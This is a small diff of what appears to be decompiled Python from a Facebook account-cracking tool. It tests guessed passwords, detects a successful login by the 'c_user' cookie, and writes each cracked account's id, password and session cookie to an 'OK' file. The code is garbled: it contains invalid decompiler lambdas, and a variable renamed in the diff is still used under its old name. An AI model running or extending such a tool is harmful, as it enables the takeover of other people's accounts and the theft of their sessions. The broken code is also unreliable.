@@ -1369,7 +1369,7 @@ for xd in range(10000):
                 if 'c_user' in ses.cookies.get_dict().keys():
                     ok += 1
                     coki = po.cookies.get_dict()
-                    kuki = (lambda .0: for key, value in .0:
+                    koki = (lambda .0: for key, value in .0:
 [ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
                     print(f'''\r{P}{H} [DEVI-OK] {H}{idf}|{pw}\n{P}[{H}Cookei]{P}\x1b[1;34m{kuki}''')
                     open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
@@ -1487,4 +1487,5 @@ for xd in range(10000):
             Mano_menu()
             return None
         return None
+
 
